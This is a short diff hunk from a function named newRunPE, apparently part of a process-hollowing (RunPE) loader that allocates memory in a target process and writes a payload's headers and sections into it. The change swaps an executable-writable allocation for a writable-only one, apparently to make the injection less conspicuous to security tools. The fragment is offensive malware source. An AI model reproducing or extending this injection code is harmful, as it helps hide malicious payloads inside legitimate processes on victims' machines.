@@ -44,7 +44,7 @@ void newRunPE(LPSTR szFilePath, LPCTSTR desiredCurrentDirectory, PVOID pFile, LP
 						}
 					
 						// Allocate new memory in target process for the payload
-						pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+						pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_READWRITE);
 						
 						if (pImageBase) {
 							// Write payload headers and sections into target process
